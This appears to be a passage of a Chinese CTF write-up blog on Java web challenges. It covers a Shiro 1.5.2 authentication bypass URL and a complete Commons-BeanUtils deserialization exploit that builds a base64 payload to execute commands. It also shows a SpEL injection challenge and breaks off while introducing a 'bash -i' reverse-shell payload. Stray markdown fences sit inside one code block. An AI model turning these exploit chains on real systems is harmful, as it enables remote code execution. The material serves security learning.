href="https://xz.aliyun.com/t/13279">参考文章</a></p><p><code>application.properties</code>:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">server.port</span>=<span class="hljs-number">8090</span><br><span class="hljs-attr">server.servlet.context-path</span>=/web<br><span class="hljs-attr">spring.thymeleaf.cache</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">spring.thymeleaf.mode</span>=HTML5<br></code></pre></td></tr></table></figure><p>应用程序将在 <code>/web</code> 上下文路径下运行。例如，如果应用程序的域名是 <code>example.com</code>，那么应用程序将可以通过 <code>http://example.com/web</code> 访问</p><p>Shiro版本1.5.2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Shiro框架--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>ShiroConfig.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroConfig</span> &#123;<br>   <span class="hljs-meta">@Bean</span><br>   <span class="hljs-keyword">public</span> ShiroFilterFactoryBean <span class="hljs-title function_">getShiroFilterFactoryBean</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;getDefaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;<br>      <span class="hljs-type">ShiroFilterFactoryBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroFilterFactoryBean</span>();<br>      bean.setSecurityManager(defaultWebSecurityManager);<br>      Map&lt;String, String&gt; filterMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();<br>      filterMap.put(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;anon&quot;</span>);<br>      filterMap.put(<span class="hljs-string">&quot;/login&quot;</span>, <span class="hljs-string">&quot;anon&quot;</span>);<br>      filterMap.put(<span class="hljs-string">&quot;/admin/*&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>      bean.setFilterChainDefinitionMap(filterMap);<br>      bean.setLoginUrl(<span class="hljs-string">&quot;/login&quot;</span>);<br>      <span class="hljs-keyword">return</span> bean;<br>   &#125;<br><br>   <span class="hljs-meta">@Bean</span><br>   <span class="hljs-keyword">public</span> DefaultWebSecurityManager <span class="hljs-title function_">getDefaultWebSecurityManager</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;adminRealm&quot;)</span> AdminRealm adminRealm)</span> &#123;<br>      <span class="hljs-type">DefaultWebSecurityManager</span> <span class="hljs-variable">securityManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultWebSecurityManager</span>();<br>      securityManager.setRealm(adminRealm);<br>      <span class="hljs-keyword">return</span> securityManager;<br>   &#125;<br><br>   <span class="hljs-meta">@Bean</span><br>   <span class="hljs-keyword">public</span> AdminRealm <span class="hljs-title function_">adminRealm</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminRealm</span>();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>anon：表示允许匿名访问，即不需要进行身份验证就可以访问对应的URL<br>authc：表示需要进行身份验证后才能访问，即用户必须登录后才能访问对应的URL</p></blockquote><p><code>HelloController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butler.springboot14shiro.MyController;<br><br><span class="hljs-keyword">import</span> com.butler.springboot14shiro.Util.MyObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.SecurityUtils;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.UnknownAccountException;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;<br><span class="hljs-keyword">import</span> org.apache.shiro.subject.Subject;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>      model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Hello World&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/login&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password, Model model)</span> &#123;<br>      <span class="hljs-type">Subject</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();<br>      <span class="hljs-type">UsernamePasswordToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernamePasswordToken</span>(username, password);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>         subject.login(token);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin/hello&quot;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (UnknownAccountException var7) &#123;<br>         model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名错误&quot;</span>);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (IncorrectCredentialsException var8) &#123;<br>         model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;密码错误&quot;</span>);<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/admin/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">admin</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(name = &quot;data&quot;,required = false)</span> String data, Model model)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(data);<br>         <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode);<br>         <span class="hljs-type">MyObjectInputStream</span> <span class="hljs-variable">myObjectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(inputStream);<br>         myObjectInputStream.readObject();<br>      &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>         var6.printStackTrace();<br>         model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;data=&quot;</span>);<br>      &#125;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin/hello&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先<code>admin/hello</code>路由下可以将<code>data</code>解码后反序列化，但问题是得绕过这个<code>Shiro</code>认证才行。</p><p><a href="https://www.cnblogs.com/nice0e3/p/16248252.html">Shiro绕过</a></p><p><img src="/img/Sshirobypass.png" alt="Sshirobypass"></p><p><a href="https://xz.aliyun.com/t/7964">分析1</a></p><p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">分析2</a></p><p>构造<code>http://node4.anna.nssctf.cn:28969/;/web/admin/hello?data=</code>即可绕过<code>shiro</code>的身份验证</p><p>然后<code>MyObjectInputSteam</code>里ban了这些：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">blackList.add(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl&quot;</span>);<br>blackList.add(<span class="hljs-string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);<br>blackList.add(<span class="hljs-string">&quot;java.security.SignedObject&quot;</span>);<br>blackList.add(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br></code></pre></td></tr></table></figure><p>阻止了使用<code>Hibernate</code>反序列化链和<code>Jdbc</code>链子，但是这里是Shiro，内置的<code>BeanComparator</code>并没有被过滤，因此可以打<code>CB</code>链子，注意这里是<code>commons-beanutils1.9.4</code>，做poc的时候也要换成相同的版本，否则是报<code>serializeUID</code>错误。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后面就是<code>CB</code>那条动态加载字节码的链子了，比如弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Clac</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面exec里的command用这个写(我写calc方便本地测试)：</p><p>[java反弹shell](<a href="https://ares-x.com/tools/runtime-exec/">Runtime.exec Payload Generater | AresX’s Blog</a>)</p><p>EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butler.springboot14shiro.exp;<br> <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br> <br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        BeanComparator beanComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br> <br>        <span class="hljs-type">byte</span>[] result=serialize(priorityQueue);<br>        System.out.println(Base64.getEncoder().encodeToString(result));<br> <br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream byteArrayOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个CB的写法和当时跟DB师傅学的那个有一点点不同，多了这几个东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br></code></pre></td></tr></table></figure><p>其实目标还是保证<code>add</code>的时候不执行命令，所以放了假的<code>queue</code>和<code>comparator</code>进去，效果是一样的</p><h2 id="CISCN2023华北-normal-snake-未完成"><a href="#CISCN2023华北-normal-snake-未完成" class="headerlink" title="[CISCN2023华北]normal_snake[未完成]"></a>[CISCN2023华北]normal_snake[未完成]</h2><p><code>pom.xml</code>存在：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.vaadin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>vaadin-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.7.14<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>IndexController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">```<br><br><br><br>## [D^3CTF <span class="hljs-number">2022</span>] shorter<br><br>```java<br><span class="hljs-comment">//MainController.java</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainController</span> &#123;<br>   <span class="hljs-meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@PostMapping(&#123;&quot;/hello&quot;&#125;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String baseStr)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span> (baseStr.length() &gt;= <span class="hljs-number">1956</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;too long&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(baseStr);<br>         <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode);<br>         <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>         objectInputStream.readObject();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>      &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//spel.java</span><br><span class="hljs-meta">@RestController</span> <span class="hljs-comment">// 声明该类是一个 REST 控制器，可以处理 HTTP 请求和响应</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/SPEL&quot;&#125;)</span> <span class="hljs-comment">// 映射处理该类的请求路径为 &quot;/SPEL&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spel</span> &#123; <span class="hljs-comment">// 定义一个名为 spel 的类</span><br><br>   <span class="hljs-meta">@RequestMapping(&#123;&quot;/vul&quot;&#125;)</span> <span class="hljs-comment">// 映射处理 &quot;/SPEL/vul&quot; 路径的请求</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spelVul</span><span class="hljs-params">(String ex)</span> &#123; <span class="hljs-comment">// 定义一个名为 spelVul 的方法，接收一个名为 ex 的参数</span><br>      <span class="hljs-comment">// 创建 SpEL 表达式解析器</span><br>      <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>      <span class="hljs-comment">// 创建 SpEL 表达式的评估上下文</span><br>      <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">evaluationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>      <span class="hljs-comment">// 解析并执行传入的 SpEL 表达式，获取结果，并转换为字符串</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br>      <span class="hljs-comment">// 将结果打印到控制台</span><br>      System.out.println(result);<br>      <span class="hljs-comment">// 返回结果字符串</span><br>      <span class="hljs-keyword">return</span> result;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进去是个报错页面：</p><p><img src="/img/polarspel1.png" alt="polarspel1"></p><p><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">参考文章</a></p><p>Spring Boot 框架Whitelabel Error Page SpEL注入的原因就是系统报错页面把用户的输入当做了表达式来执行。但这题没啥花花绕绕的，直接就能执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br></code></pre></td></tr></table></figure><p>这里直接将用户的输入<code>ex</code>当作表达式内容进行解析。</p><p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code>：</p><p><img src="/img/polarjava.png" alt="polarjava"></p><p>两种解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// [shell_b64_encode] 为 bash -i 